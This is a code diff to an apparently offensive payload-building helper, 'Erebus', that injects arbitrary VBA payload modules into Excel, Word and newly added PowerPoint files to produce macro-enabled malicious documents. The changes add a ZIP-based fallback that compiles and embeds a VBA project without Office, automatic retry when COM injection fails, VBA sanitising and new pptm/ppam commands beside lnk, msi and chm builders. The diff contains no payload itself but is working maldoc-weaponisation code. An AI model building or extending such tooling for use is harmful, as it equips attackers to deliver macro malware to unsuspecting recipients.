@@ -19,7 +19,6 @@ import random
 import string
 import subprocess
 import argparse
-import tempfile
 import shutil
 import stat
 import configparser
@@ -622,6 +621,23 @@ _XL_FORMAT_XLAM = 55   # xlOpenXMLAddIn                 (.xlam)
 _VBA_MODULE_TYPE_STANDARD = 1   # vbext_ct_StdModule
 
 
+import re as _re
+
+
+def _sanitize_vba(vba_code: str) -> str:
+    """
+    Strip artefacts that cause VBA compile errors when injecting via COM.
+
+    Removes:
+      - Standalone bare-parens lines "()" that appear due to \\r\\n / \\n mixing
+        in the builder's f-string templates.
+      - Runs of 3+ blank lines collapsed to 2.
+    """
+    vba_code = _re.sub(r'(?m)^\s*\(\)\s*$', '', vba_code)
+    vba_code = _re.sub(r'\n{3,}', '\n\n', vba_code)
+    return vba_code
+
+
 def _com_available() -> bool:
     """Return True if win32com.client can be imported (Windows + pywin32)."""
     try:
@@ -723,18 +739,28 @@ def _inject_via_com(
         new_mod.CodeModule.AddFromString(vba_code)
         logger.info(f"Injected VBA module '{module_name}' ({len(vba_code)} chars)")
 
-        # SaveAs fails if the destination already exists (COM does not overwrite).
-        # Save to a clean temp path first, then move to the final destination.
-        tmp_fd, tmp_path_str = tempfile.mkstemp(suffix=correct_ext)
-        os.close(tmp_fd)
-        tmp_path = Path(tmp_path_str)
+        # Build temp path in output directory (not %TEMP% - untrusted location for
+        # macro-enabled workbooks).  Do NOT pre-create the file: SaveAs fails with
+        # error 1004 when the path already exists and DisplayAlerts=False because
+        # Excel silently selects "No" on the overwrite conflict dialog.
+        rnd = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
+        tmp_path = out.parent / f"~erebus_{rnd}{correct_ext}"
 
+        # Briefly make Excel visible and enable alerts so security/trust dialogs
+        # are not silently swallowed (Visible=False + DisplayAlerts=False causes
+        # hidden dialogs to block SaveAs → error 1004).
+        was_visible = excel.Visible
+        excel.Visible = True
+        excel.DisplayAlerts = True
         try:
-            wb.SaveAs(str(tmp_path), FileFormat=xl_format)
+            wb.SaveAs(str(tmp_path), FileFormat=xl_format, AddToMru=False)
             logger.info(f"Saved workbook to temp: {tmp_path.name} (format {xl_format})")
         except Exception as save_exc:
             tmp_path.unlink(missing_ok=True)
             raise save_exc
+        finally:
+            excel.DisplayAlerts = False
+            excel.Visible = was_visible
 
         wb.Close(SaveChanges=False)
         wb = None
@@ -822,37 +848,206 @@ def _inject_via_zip(
     fmt: str,
     template_path: Optional[str] = None,
 ) -> Tuple[bool, str]:
-    """ZIP-based VBA injection fallback (Linux / no Excel)."""
+    """ZIP-based VBA injection fallback (Linux / no Excel / COM failure).
+
+    Self-contained: uses compile_vba_project inlined by _bundle_helper_as_single_file,
+    with multi-path package fallbacks for Docker/dev environments.
+    """
+    import zipfile
+    from io import BytesIO
+    import re as _re
+
+    # --- Locate compile_vba_project ------------------------------------------
+    # Try package import (Docker / dev), then fall back to the copy inlined into
+    # this single-file erebus_helper.py bundle by _bundle_helper_as_single_file.
+    compile_fn = None
+    _script_dir = Path(__file__).resolve().parent
+    for _root in [
+        _script_dir,
+        _script_dir.parent,
+        _script_dir.parent.parent,
+        _script_dir.parent.parent.parent.parent,
+    ]:
+        _root_str = str(_root)
+        if _root_str not in sys.path:
+            sys.path.insert(0, _root_str)
+        try:
+            from vba_compiler import compile_vba_project as _fn
+            compile_fn = _fn
+            break
+        except ImportError:
+            pass
+        try:
+            from agent_code.vba_compiler import compile_vba_project as _fn
+            compile_fn = _fn
+            break
+        except ImportError:
+            pass
+
+    if compile_fn is None:
+        compile_fn = globals().get("compile_vba_project")
+
+    if compile_fn is None:
+        return False, "ZIP fallback: vba_compiler not available (not bundled and not on path)"
+
+    # --- Parse module name from VBA Attribute VB_Name ------------------------
+    _mn = _re.search(r'Attribute\s+VB_Name\s*=\s*"(\w+)"', vba_code, _re.IGNORECASE)
+    module_name = _mn.group(1) if _mn else "ErebusPayload"
+
+    # --- Build vbaProject.bin ------------------------------------------------
     try:
-        _root = Path(__file__).resolve().parent.parent.parent.parent
-        sys.path.insert(0, str(_root))
-
-        from erebus_wrapper.erebus.modules.plugin_payload_maldocs import PayloadMalDocsPlugin
-        plugin = PayloadMalDocsPlugin()
-
-        out = Path(output_path)
-        if source_excel:
-            result_path = plugin.backdoor_existing_excel(
-                source_excel=source_excel,
-                vba_payload=vba_code,
-                output_path=str(out),
-            )
-        else:
-            # Resolve template for new workbook creation
-            tpl = _resolve_template(output_path, template_path)
-            result_path = plugin.generate_excel_payload(
-                payload_path=str(out.parent),
-                vba_payload=vba_code,
-                output_path=str(out),
-                template_path=tpl,
-            )
-
-        if result_path and Path(result_path).exists():
-            return True, str(result_path)
-        return False, "ZIP injection produced no output"
-
+        vba_bin = compile_fn(vba_code, module_name=module_name)
     except Exception as exc:
-        return False, f"ZIP fallback failed: {exc}"
+        return False, f"ZIP fallback: vba_compiler error: {exc}"
+
+    # --- Inline OOXML templates (no external package dependency) -------------
+    _CT_XLSM = (
+        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
+        '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">\n'
+        '  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>\n'
+        '  <Default Extension="xml"  ContentType="application/xml"/>\n'
+        '  <Override PartName="/xl/workbook.xml"\n'
+        '    ContentType="application/vnd.ms-excel.sheet.macroEnabled.main+xml"/>\n'
+        '  <Override PartName="/xl/worksheets/sheet1.xml"\n'
+        '    ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>\n'
+        '  <Override PartName="/xl/styles.xml"\n'
+        '    ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.styles+xml"/>\n'
+        '  <Override PartName="/xl/vbaProject.bin"\n'
+        '    ContentType="application/vnd.ms-excel.vbaProject"/>\n'
+        '</Types>'
+    )
+    _ROOT_RELS = (
+        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
+        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">\n'
+        '  <Relationship Id="rId1"\n'
+        '    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument"\n'
+        '    Target="xl/workbook.xml"/>\n'
+        '</Relationships>'
+    )
+    _WB_XML = (
+        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
+        '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"\n'
+        '          xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">\n'
+        '  <sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/></sheets>\n'
+        '</workbook>'
+    )
+    _WB_RELS = (
+        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
+        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">\n'
+        '  <Relationship Id="rId1"\n'
+        '    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet"\n'
+        '    Target="worksheets/sheet1.xml"/>\n'
+        '  <Relationship Id="rId2"\n'
+        '    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles"\n'
+        '    Target="styles.xml"/>\n'
+        '  <Relationship Id="rId3"\n'
+        '    Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject"\n'
+        '    Target="vbaProject.bin"/>\n'
+        '</Relationships>'
+    )
+    _SHEET = (
+        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
+        '<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
+        '<sheetData/></worksheet>'
+    )
+    _STYLES = (
+        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
+        '<styleSheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
+        '<fonts count="1"><font><sz val="11"/><name val="Calibri"/></font></fonts>'
+        '<fills count="2"><fill><patternFill patternType="none"/></fill>'
+        '<fill><patternFill patternType="gray125"/></fill></fills>'
+        '<borders count="1"><border><left/><right/><top/><bottom/><diagonal/></border></borders>'
+        '<cellStyleXfs count="1"><xf numFmtId="0" fontId="0" fillId="0" borderId="0"/></cellStyleXfs>'
+        '<cellXfs count="1"><xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0"/></cellXfs>'
+        '</styleSheet>'
+    )
+
+    # --- Assemble XLSM ZIP ---------------------------------------------------
+    try:
+        out = Path(output_path).resolve()
+        out.parent.mkdir(parents=True, exist_ok=True)
+        if out.suffix.lower() not in ('.xlsm', '.xlam'):
+            out = out.with_suffix('.xlsm')
+
+        tpl = _resolve_template(output_path, template_path)
+        if tpl and tpl.exists():
+            # Patch template: replace/inject vbaProject.bin and ensure
+            # [Content_Types].xml and workbook.xml.rels reference it.
+            # Templates may be plain xlsx exports with no prior VBA project.
+            import xml.etree.ElementTree as _ET
+            _VBA_CT = "application/vnd.ms-excel.vbaProject"
+            _VBA_REL_TYPE = "http://schemas.microsoft.com/office/2006/relationships/vbaProject"
+
+            buf = BytesIO()
+            with zipfile.ZipFile(BytesIO(tpl.read_bytes()), 'r') as zin, \
+                 zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zout:
+                for item in zin.infolist():
+                    if item.filename == "xl/vbaProject.bin":
+                        continue
+                    data = zin.read(item.filename)
+
+                    if item.filename == "[Content_Types].xml":
+                        root = _ET.fromstring(data)
+                        ns = "http://schemas.openxmlformats.org/package/2006/content-types"
+                        _ET.register_namespace("", ns)
+                        has_vba = any(
+                            el.get("PartName", "").endswith("vbaProject.bin")
+                            for el in root
+                        )
+                        if not has_vba:
+                            ov = _ET.SubElement(root, f"{{{ns}}}Override")
+                            ov.set("PartName", "/xl/vbaProject.bin")
+                            ov.set("ContentType", _VBA_CT)
+                        data = (
+                            b"<?xml version='1.0' encoding='UTF-8' standalone='yes'?>\n"
+                            + _ET.tostring(root, encoding="unicode").encode()
+                        )
+
+                    elif item.filename == "xl/_rels/workbook.xml.rels":
+                        root = _ET.fromstring(data)
+                        ns = "http://schemas.openxmlformats.org/package/2006/relationships"
+                        _ET.register_namespace("", ns)
+                        has_vba = any(
+                            "vbaProject" in el.get("Target", "")
+                            for el in root
+                        )
+                        if not has_vba:
+                            existing_ids = [
+                                int(el.get("Id", "rId0").replace("rId", ""))
+                                for el in root
+                                if el.get("Id", "").startswith("rId")
+                            ]
+                            next_id = max(existing_ids, default=0) + 1
+                            rel = _ET.SubElement(root, f"{{{ns}}}Relationship")
+                            rel.set("Id", f"rId{next_id}")
+                            rel.set("Type", _VBA_REL_TYPE)
+                            rel.set("Target", "vbaProject.bin")
+                        data = (
+                            b"<?xml version='1.0' encoding='UTF-8' standalone='yes'?>\n"
+                            + _ET.tostring(root, encoding="unicode").encode()
+                        )
+
+                    zout.writestr(item, data)
+                zout.writestr("xl/vbaProject.bin", vba_bin)
+            out.write_bytes(buf.getvalue())
+            logger.info(f"ZIP fallback: patched template → {out.name}")
+        else:
+            # Build minimal XLSM from scratch
+            buf = BytesIO()
+            with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
+                zf.writestr("[Content_Types].xml", _CT_XLSM)
+                zf.writestr("_rels/.rels", _ROOT_RELS)
+                zf.writestr("xl/workbook.xml", _WB_XML)
+                zf.writestr("xl/_rels/workbook.xml.rels", _WB_RELS)
+                zf.writestr("xl/worksheets/sheet1.xml", _SHEET)
+                zf.writestr("xl/styles.xml", _STYLES)
+                zf.writestr("xl/vbaProject.bin", vba_bin)
+            out.write_bytes(buf.getvalue())
+            logger.info(f"ZIP fallback: built minimal XLSM → {out.name}")
+
+        return True, str(out)
+    except Exception as exc:
+        return False, f"ZIP fallback: assembly failed: {exc}"
 
 
 class ExcelMaldocHelper:
@@ -877,7 +1072,7 @@ class ExcelMaldocHelper:
     ) -> Tuple[bool, str]:
         if self._use_com:
             logger.info("Using COM-based Excel injection")
-            return _inject_via_com(
+            ok, msg = _inject_via_com(
                 vba_code=vba_code,
                 output_path=output_path,
                 source_excel=source_excel,
@@ -885,6 +1080,16 @@ class ExcelMaldocHelper:
                 module_name=module_name,
                 template_path=template_path,
             )
+            if not ok:
+                logger.warning(f"COM injection failed ({msg}), retrying with ZIP fallback")
+                return _inject_via_zip(
+                    vba_code=vba_code,
+                    output_path=output_path,
+                    source_excel=source_excel,
+                    fmt=fmt,
+                    template_path=template_path,
+                )
+            return ok, msg
         else:
             logger.info("Using ZIP-based Excel injection (fallback)")
             return _inject_via_zip(
@@ -912,6 +1117,8 @@ class ExcelMaldocHelper:
             vba_code = bas.read_text(encoding="utf-8")
         except Exception as exc:
             return False, f"Could not read .bas file: {exc}"
+
+        vba_code = _sanitize_vba(vba_code)
 
         return self.inject_vba(
             vba_code=vba_code,
@@ -1011,17 +1218,21 @@ def _inject_word_via_com(
         new_mod.CodeModule.AddFromString(vba_code)
         logger.info(f"Injected VBA module '{module_name}' ({len(vba_code)} chars)")
 
-        # Save to temp then move (SaveAs fails on existing destination)
-        tmp_fd, tmp_path_str = tempfile.mkstemp(suffix=ext)
-        os.close(tmp_fd)
-        tmp_path = Path(tmp_path_str)
+        # Build temp path in output directory (not %TEMP% - untrusted for macro files).
+        # Do NOT pre-create the file: SaveAs2 fails with 1004 on an existing path.
+        rnd = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
+        tmp_path = out.parent / f"~erebus_{rnd}{ext}"
 
+        was_visible = word.Visible
+        word.Visible = True
         try:
             doc.SaveAs2(str(tmp_path), FileFormat=wd_format)
             logger.info(f"Saved document to temp: {tmp_path.name}")
         except Exception as save_exc:
             tmp_path.unlink(missing_ok=True)
             raise save_exc
+        finally:
+            word.Visible = was_visible
 
         doc.Close(SaveChanges=False)
         doc = None
@@ -1053,6 +1264,187 @@ def _inject_word_via_com(
                 word.Quit()
         except Exception:
             pass
+
+
+# ============================================================================
+# PowerPointMaldocHelper - VBA injection into PPTM/PPAM via PowerPoint COM
+# ============================================================================
+
+# PowerPoint file format constants (PpSaveAsFileType enum)
+_PP_FORMAT_PPTM = 25   # ppSaveAsOpenXMLPresentationMacroEnabled (.pptm)
+_PP_FORMAT_PPAM = 30   # ppSaveAsOpenXMLAddin                    (.ppam)
+
+
+def _get_ppt_app():
+    """Create a PowerPoint application COM object."""
+    if not _com_available():
+        raise RuntimeError("pywin32 not found.  Install with: pip install pywin32")
+    import win32com.client
+    try:
+        ppt = win32com.client.Dispatch("PowerPoint.Application")
+    except Exception as exc:
+        raise RuntimeError(f"Failed to start PowerPoint via COM: {exc}") from exc
+    ppt.Visible = 1   # msoTrue - required on some PPT versions for non-interactive use
+    return ppt
+
+
+def _inject_ppt_via_com(
+    vba_code: str,
+    output_path: str,
+    source_ppt: Optional[str],
+    fmt: str,
+    module_name: str = "ErebusPayload",
+    template_path: Optional[str] = None,
+) -> Tuple[bool, str]:
+    """Inject VBA into a PowerPoint file (.pptm or .ppam) via COM automation."""
+    pp_format = _PP_FORMAT_PPAM if fmt.lower() == "ppam" else _PP_FORMAT_PPTM
+    ext = ".ppam" if fmt.lower() == "ppam" else ".pptm"
+
+    out = Path(output_path).resolve()
+    out.parent.mkdir(parents=True, exist_ok=True)
+    if out.suffix.lower() != ext:
+        out = out.with_suffix(ext)
+        logger.info(f"Adjusted output extension to {ext}: {out.name}")
+
+    ppt = None
+    prs = None
+    try:
+        ppt = _get_ppt_app()
+
+        if source_ppt:
+            src = Path(source_ppt).resolve()
+            if not src.exists():
+                return False, f"Source PowerPoint file not found: {source_ppt}"
+            prs = ppt.Presentations.Open(str(src), False, False, False)
+            logger.info(f"Opened source presentation: {src.name}")
+        else:
+            if template_path and Path(template_path).exists():
+                prs = ppt.Presentations.Open(
+                    str(Path(template_path).resolve()), False, False, False
+                )
+                logger.info(f"Opened template: {Path(template_path).name}")
+            else:
+                prs = ppt.Presentations.Add(WithWindow=False)
+                logger.info("Created new blank presentation")
+
+        try:
+            vba_project = prs.VBProject
+        except Exception as exc:
+            return False, (
+                f"Cannot access VBA project: {exc}.  "
+                "Ensure 'Trust access to the VBA project object model' is enabled "
+                "in PowerPoint > Options > Trust Center > Macro Settings."
+            )
+
+        components = vba_project.VBComponents
+        for comp in components:
+            if comp.Name == module_name:
+                try:
+                    components.Remove(comp)
+                    logger.info(f"Removed existing module '{module_name}'")
+                except Exception:
+                    pass
+                break
+
+        new_mod = components.Add(1)   # vbext_ct_StdModule
+        new_mod.Name = module_name
+        new_mod.CodeModule.AddFromString(vba_code)
+        logger.info(f"Injected VBA module '{module_name}' ({len(vba_code)} chars)")
+
+        rnd = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
+        tmp_path = out.parent / f"~erebus_{rnd}{ext}"
+
+        prs.SaveAs(str(tmp_path), pp_format)
+        logger.info(f"Saved presentation to temp: {tmp_path.name}")
+
+        prs.Close()
+        prs = None
+        ppt.Quit()
+        ppt = None
+
+        if out.exists():
+            out.unlink()
+        shutil.move(str(tmp_path), str(out))
+
+        if not out.exists():
+            return False, "PowerPoint saved cleanly but output file not found on disk"
+
+        size = out.stat().st_size
+        logger.info(f"Output: {out}  ({size:,} bytes)")
+        return True, str(out)
+
+    except Exception as exc:
+        logger.error(f"PowerPoint COM injection failed: {exc}")
+        return False, str(exc)
+    finally:
+        try:
+            if prs is not None:
+                prs.Close()
+        except Exception:
+            pass
+        try:
+            if ppt is not None:
+                ppt.Quit()
+        except Exception:
+            pass
+
+
+class PowerPointMaldocHelper:
+    """High-level helper for PPTM / PPAM maldoc creation via COM automation."""
+
+    def __init__(self, prefer_com: bool = True):
+        self._use_com = prefer_com and _com_available()
+        if not self._use_com:
+            logger.warning(
+                "pywin32 / PowerPoint not available.  "
+                "PowerPoint COM injection requires a Windows host with pywin32 and Microsoft PowerPoint installed."
+            )
+
+    def inject_vba(
+        self,
+        vba_code: str,
+        output_path: str,
+        source_ppt: Optional[str] = None,
+        fmt: str = "pptm",
+        module_name: str = "ErebusPayload",
+        template_path: Optional[str] = None,
+    ) -> Tuple[bool, str]:
+        if not self._use_com:
+            return False, "PowerPoint COM injection requires Windows + pywin32 + Microsoft PowerPoint"
+        return _inject_ppt_via_com(
+            vba_code=vba_code,
+            output_path=output_path,
+            source_ppt=source_ppt,
+            fmt=fmt,
+            module_name=module_name,
+            template_path=template_path,
+        )
+
+    def from_bas_file(
+        self,
+        bas_path: str,
+        output_path: str,
+        source_ppt: Optional[str] = None,
+        fmt: str = "pptm",
+        module_name: str = "ErebusPayload",
+        template_path: Optional[str] = None,
+    ) -> Tuple[bool, str]:
+        bas = Path(bas_path)
+        if not bas.exists():
+            return False, f"VBA .bas file not found: {bas_path}"
+        try:
+            vba_code = bas.read_text(encoding="utf-8")
+        except Exception as exc:
+            return False, f"Could not read .bas file: {exc}"
+        vba_code = _sanitize_vba(vba_code)
+        return self.inject_vba(
+            vba_code=vba_code,
+            output_path=output_path,
+            source_ppt=source_ppt,
+            fmt=fmt,
+            module_name=module_name,
+            template_path=template_path,
+        )
 
 
 class WordMaldocHelper:
@@ -1102,6 +1494,7 @@ class WordMaldocHelper:
             vba_code = bas.read_text(encoding="utf-8")
         except Exception as exc:
             return False, f"Could not read .bas file: {exc}"
+        vba_code = _sanitize_vba(vba_code)
         return self.inject_vba(
             vba_code=vba_code,
             output_path=output_path,
@@ -1121,7 +1514,7 @@ def main():
 
     parser.add_argument(
         'command',
-        choices=['verify', 'excel', 'xlsx', 'xlsm', 'xlam', 'docm', 'doc', 'lnk', 'msi', 'electron', 'chm'],
+        choices=['verify', 'excel', 'xlsx', 'xlsm', 'xlam', 'docm', 'doc', 'pptm', 'ppam', 'lnk', 'msi', 'electron', 'chm'],
         help='Build/create command to execute'
     )
 
@@ -1353,6 +1746,9 @@ def main():
     elif args.command in ('docm', 'doc'):
         if not args.bas_file:
             parser.error(f"--bas-file is required for {args.command} command")
+    elif args.command in ('pptm', 'ppam'):
+        if not args.bas_file:
+            parser.error(f"--bas-file is required for {args.command} command")
     elif args.command == 'lnk':
         # For lnk: --target-binary is the target, other args are optional
         if not args.target_binary:
@@ -1438,6 +1834,22 @@ def main():
                 success = ok
             except Exception as e:
                 logger.error(f"Word maldoc creation failed: {e}")
+                success = False
+
+        elif args.command in ('pptm', 'ppam'):
+            try:
+                helper = PowerPointMaldocHelper(prefer_com=not args.no_com)
+                ok, msg = helper.from_bas_file(
+                    bas_path=args.bas_file,
+                    output_path=args.output,
+                    fmt=args.command,
+                    module_name=args.module_name,
+                )
+                if not ok:
+                    logger.error(f"PowerPoint maldoc injection failed: {msg}")
+                success = ok
+            except Exception as e:
+                logger.error(f"PowerPoint maldoc creation failed: {e}")
                 success = False
 
         elif args.command == 'lnk':
